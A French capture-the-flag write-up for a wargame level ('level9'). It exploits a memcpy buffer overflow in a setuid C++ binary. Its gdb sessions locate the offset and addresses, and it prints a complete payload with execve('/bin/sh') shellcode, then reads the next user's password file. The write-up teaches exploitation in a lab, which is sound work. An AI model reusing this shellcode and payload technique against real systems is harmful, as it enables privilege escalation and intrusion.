## Comportement
- J'ai des droits `level9` que je peux vérifier en tapant `whoami`
- Un binaire est présent avec des droits différents : `-rwsr-s---+ 1 bonus0 users  6720 Mar  6  2016 level9*`
- En exécutant le binaire (`./level9`), on observe rien de particulier. l’exécutable semble quitter peu importe si nous mettons des arguments ou non.


## Analyse
- Code en C++.
- Utilisation de `memcpy()` qui est vulnerable si l'on ne verifie pas l'input d'abord. On peut l'overflow.
  ```shell
    (gdb) info function
    ...
    0x08048510  memcpy
    0x08048510  memcpy@plt
    ...
  ```
- Pas de call a `/bin/sh` il faut donc probablement utiliser un shellcode.


## Résolution
- On trouve l'offset de `eax`, qui correspond a `argv[1]`, le premier argument passe a `memcpy()` que l'on veut exploit. On utilise le pattern generator : offset de `eax` demarre a 108.
  ```shell
    (gdb) run 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag'
    Starting program: /home/user/level9/level9 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag'

    Program received signal SIGSEGV, Segmentation fault.
    0x08048682 in main ()
    (gdb) info register eax
    eax            0x41366441       1094083649
    (gdb)
  ```
- L'adresse du 1er argument est : `0x0804a00c`. On check notre saut dans la memoire : 
  ```shell
    (gdb) r $(python -c 'print "A" * 108 + "\x0c\xa0\x04\x08"')
    Starting program: /home/user/level9/level9 $(python -c 'print "A" * 108 + "\x0c\xa0\x04\x08"')

    Program received signal SIGSEGV, Segmentation fault.
    0x41414141 in ?? ()
  ```
- Puisque le programme a fait deux fois  `mov    eax,DWORD PTR [eax]`, on est allé à l'adresse 0x41414141 ("AAAA"). On corrige cela en changeant le début par l'adresse suivante : `\x10\xa0\x04\x08`` et en diminuant de 4 bytes la longueur.
  ```shell
    payload : shell_addr + shellcode + padding + buffer_addr
              [4 bytes]   [28 bytes]  [76 bytes]  [4 bytes] = 108 + 4
  ```
- On craft notre payload : 
  ```shell
    python -c 'print "\x10\xa0\x04\x08" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A" * 76 + "\x0c\xa0\04\x08"'
  ```
- On l'execute: 
  ```shell
    ./level9 $(python -c 'print "\x10\xa0\x04\x08" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A" * 76 + "\x0c\xa0\04\x08"')
  ```
- Un shell s'ouvre avec de nouveaux privilèges : en effet, si l'on tape `whoami`, on obtient `bonus0`.
- Il ne reste plus qu'à :
  - récupérer le password (`cat /home/user/bonus0/.pass`)
  - quitter le shell (`exit`)
  - et passer au bonus0 (`su bonus0`) en renseignant ce password.
